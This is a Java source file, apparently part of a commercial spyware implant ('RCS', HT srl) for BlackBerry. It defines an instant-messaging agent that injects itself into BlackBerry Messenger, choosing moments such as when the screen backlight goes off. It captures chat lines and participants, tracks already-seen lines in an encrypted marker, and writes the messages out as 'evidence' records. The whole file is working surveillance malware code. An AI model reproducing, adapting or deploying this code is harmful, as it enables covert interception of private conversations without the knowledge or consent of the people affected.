//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : TaskAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.io.IOException;
import java.util.Vector;

import net.rim.device.api.system.Backlight;
import blackberry.AgentManager;
import blackberry.AppListener;
import blackberry.agent.im.Line;
import blackberry.config.Conf;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.Markup;
import blackberry.injection.AppInjector;
import blackberry.interfaces.ApplicationObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * Instant Message.
 */
public final class ImAgent extends Agent implements BacklightObserver,
        ApplicationObserver {
    //#ifdef DEBUG
    static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
    //#endif

    private static final long APP_TIMER_PERIOD = 3000;

    AppInjector appInjector;
    //boolean infected;

    String appName = "Messenger";

    Line lastLine;
    Markup markup;

    /**
     * Instantiates a new task agents
     * 
     * @param agentStatus
     *            the agent status
     */
    public ImAgent(final boolean agentEnabled) {
        super(Agent.AGENT_IM, agentEnabled, Conf.AGENT_IM_ON_SD, "ImAgent");

        //#ifdef IM_FORCED
        enable(true);
        //#endif

    }

    /**
     * Instantiates a new task agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ImAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);

        setPeriod(APP_TIMER_PERIOD);
        setDelay(APP_TIMER_PERIOD);

        markup = new Markup(agentId, Encryption.getKeys().getAesKey());
        lastLine = unserialize();
    }

    private Line unserialize() {
        //#ifdef DEBUG
        debug.trace("unserialize");
        //#endif
        if (markup.isMarkup()) {
            try {
                byte[] data = markup.readMarkup();

                //#ifdef DEBUG
                debug.trace("unserialize: " + Utils.byteArrayToHex(data));
                //#endif

                lastLine = Line.unserialize(data);
                //#ifdef DEBUG
                debug.trace("unserialize: " + lastLine);
                //#endif
            } catch (IOException e) {
                //#ifdef DEBUG
                debug.error("unserialize: " + e);
                //#endif
            }
        }
        return null;
    }

    private void serialize(Line lastLine) {
        //#ifdef DEBUG
        debug.trace("serialize: " + lastLine);
        //#endif

        byte[] data = lastLine.serialize();

        //#ifdef DEBUG
        debug.trace("serialize: " + Utils.byteArrayToHex(data));
        //#endif

        if (!markup.isMarkup()) {
            markup.createEmptyMarkup();
        }

        markup.writeMarkup(data);
    }

    public static ImAgent getInstance() {
        return (ImAgent) AgentManager.getInstance().getItem(Agent.AGENT_IM);
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif

        AppListener.getInstance().addBacklightObserver(this);
        AppListener.getInstance().addApplicationObserver(this);

        try {
            appInjector = new AppInjector(AppInjector.APP_BBM);

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("actualStart: " + ex);
            //#endif
        }

    }

    private void menuInject() {
        //#ifdef DEBUG
        debug.trace("menuInject");
        //#endif

        appInjector.infect();
    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif

        AppListener.getInstance().removeBacklightObserver(this);
        AppListener.getInstance().removeApplicationObserver(this);
    }

    boolean infecting = false;

    public void actualRun() {

        if (appInjector.isInfected() && Backlight.isEnabled()
                && isAppForeground) {
            //#ifdef DEBUG
            debug.info("actualRun, infected, enabled, foreground");
            //#endif

            //appInjector.callMenuInContext();
        }
        //#ifdef DEBUG
        if (!appInjector.isInfected() && !infecting) {
            infecting = true;
            menuInject();
        }
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG
        if (confParameters != null) {
            debug.trace("parse: " + Utils.byteArrayToHex(confParameters));
        } else {
            debug.trace("parse: null");
        }
        //#endif

        setPeriod(APP_TIMER_PERIOD);
        setDelay(APP_TIMER_PERIOD);
        return false;
    }

    public void onBacklightChange(boolean on) {
        if (!on && !appInjector.isInfected()) {
            //#ifdef DEBUG
            debug.info("onBacklightChange, injecting");
            //#endif

            //TODO: qui bisogna verificare che non avvengano due injection alla volta
            menuInject();
        }
    }

    boolean isAppForeground;

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {
        if (startedName != null && startedName.indexOf(appName) >= 0) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: foreground");
            //#endif
            isAppForeground = true;
        } else {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: not foreground");
            //#endif
            isAppForeground = false;
        }
    }

    public void add(String partecipants, Vector lines) {
        if (lines == null) {
            //#ifdef DEBUG
            debug.error("add: null lines");
            //#endif
            return;
        }

        //#ifdef DEBUG
        debug.trace("add : " + partecipants + " lines: " + lines.size());
        //#endif

        //#ifdef DBC
        Check.asserts(lines != null, "null lines");
        //#endif

        if (lines.lastElement().equals(lastLine)) {
            //#ifdef DEBUG
            debug.trace("add: nothing new");
            //#endif
            return;
        }

        int lastEqual;
        for (lastEqual = lines.size() - 1; lastEqual >= 0; lastEqual--) {
            if (lines.elementAt(lastEqual).equals(lastLine)) {
                //#ifdef DEBUGs
                debug.trace("add found: " + lastEqual);
                //#endif
                break;
            }
        }

        if (lastEqual <= 0) {
            lastEqual = 0;
            //#ifdef DEBUG
            debug.info("add: no found, save everything.");
            //#endif
        }

        try {
            lastLine = (Line) lines.lastElement();
            //#ifdef DEBUG
            debug.trace("add, serialize lastLine: " + lastLine);
            //#endif

            serialize(lastLine);
            writeEvidence(partecipants, lines, lastEqual + 1);

            //#ifdef DEBUG
            debug.trace("add end");
            //#endif
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("add: " + ex);
            //#endif
        }
    }

    private void writeEvidence(String partecipants, Vector lines, int startFrom) {
        //#ifdef DEBUG
        debug.trace("writeEvidence");
        //#endif

        //#ifdef DBC
        Check.requires(lines != null, "Null lines");
        Check.requires(lines.size() > startFrom,
                "writeEvidence wrong startFrom: " + startFrom);
        //#endif

        String imname = "BBM";
        String topic = "chat";
        String users = partecipants;

        DateTime datetime = new DateTime();
        evidence.createEvidence(null);
        final Vector items = new Vector();

        for (int i = startFrom; i < lines.size(); i++) {

            String chatcontent = ((Line) lines.elementAt(i)).getMessage();

            items.addElement(datetime.getStructTm());
            items.addElement(WChar.getBytes(imname, true));
            items.addElement(WChar.getBytes(topic, true));
            items.addElement(WChar.getBytes(users, true));
            items.addElement(WChar.getBytes(chatcontent, true));
            items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
        }

        evidence.writeEvidences(items);
        evidence.close();
    }

}
